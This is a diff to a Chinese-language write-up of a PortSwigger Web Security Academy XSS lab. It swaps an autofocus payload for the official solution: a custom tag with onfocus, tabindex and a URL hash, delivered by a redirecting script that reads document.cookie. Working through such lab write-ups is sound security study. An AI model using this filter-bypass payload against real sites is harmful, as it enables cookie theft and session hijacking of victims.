@@ -378,15 +378,17 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
 ![54.png](54.png)
 
-这一题屏蔽了所有常规标签，只允许自定义标签；测试后发现属性没有被屏蔽。因此可以用 `onfocus` 配合 `autofocus` 让自定义标签获得焦点。
-
-构造恶意页面：
+这一题屏蔽了所有常规标签，只允许自定义标签；测试后发现属性没有被屏蔽。官方做法是给自定义标签设置 `id`、`onfocus` 和 `tabindex`，再用 URL 的 hash 让页面加载后自动聚焦到该元素。
 
 ```html
 <script>
-location='https://0ad800fe0496e4cf835ac96600250002.web-security-academy.net/?search=<abc onfocus=alert(document.Cookie) autofocus tabindex=1>'
+location='https://0ad800fe0496e4cf835ac96600250002.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
 </script>
 ```
+
+这里的 `#x` 会让浏览器定位到 `id=x` 的元素；`tabindex=1` 让它可聚焦，聚焦时触发 `onfocus`。
+
+也可以用 `autofocus` 作为替代，但官方解法用的是 hash + `id`。
 
 发送给受害者即可。
 
